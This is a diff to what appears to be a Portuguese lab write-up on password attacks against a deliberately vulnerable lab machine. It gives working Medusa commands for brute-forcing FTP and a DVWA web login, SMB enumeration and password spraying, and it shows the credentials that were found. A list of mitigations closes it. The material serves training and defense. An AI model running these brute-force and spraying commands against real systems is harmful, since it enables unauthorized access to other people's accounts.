@@ -52,10 +52,10 @@ nmap -sV -p- 192.168.56.101
 ```
 Resultado principal:
 
-FTP (21) → vsftpd 2.3.4 |
-SSH (22) |
-HTTP (80) → Apache |
-SMB (445) → Samba |
+FTP (21) → vsftpd 2.3.4
+SSH (22)
+HTTP (80) → Apache
+SMB (445) → Samba
 
 ### 2. Criação de Wordlists Simples
 
@@ -72,4 +72,62 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 ```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
+Resultado:
+
+✅ ACCOUNT FOUND: User: msfadmin | Password: msfadmin
+
+### 4. Ataque Brute Force em Formulário Web (DVWA)
+
+```bash
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:"username=USER&password=PASS&Login=Login" \
+-m "FAIL=Login failed" -t 6
+```
+Resultado:
+
+✅ Conta encontrada com usuário e senha da lista.
+
+Observação: O comando original gerava warnings de “Invalid method”. A sintaxe acima é a versão corrigida e funcional.
+
+### 5. Ataque em Cadeia: Enumeração SMB + Password Spraying
+
+```bash
+# 1. Enumerar usuários
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
+
+# 2. Criar lista de usuários e senhas para spraying
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+echo -e "123456\npassword\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+# 3. Password Spraying com Medusa
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+Resultado:
+
+✅ ACCOUNT FOUND: User: msfadmin | Password: msfadmin (ADMIN$ - Access Allowed)
+
+### 6. Validação de Acesso
+
+```bash
+smbclient -L //192.168.56.101 -U msfadmin
+```
+Compartilhamentos encontrados:
+
+print$, tmp, opt, IPC$, ADMIN$, msfadmin
+
+🛡️ Recomendações de Mitigação
+
+Bloqueio de contas após X tentativas falhas (Fail2Ban / account lockout)
+Política de senhas fortes (mínimo 12 caracteres, complexidade)
+2FA / MFA em todos os serviços
+Rate limiting em formulários web
+Monitoramento de logs (falhas de login)
+Uso de chaves SSH no lugar de senhas
+Atualização constante de serviços (ex: vsftpd, Samba)
+Uso de CAPTCHA em formulários públicos
+
+
+
+
 
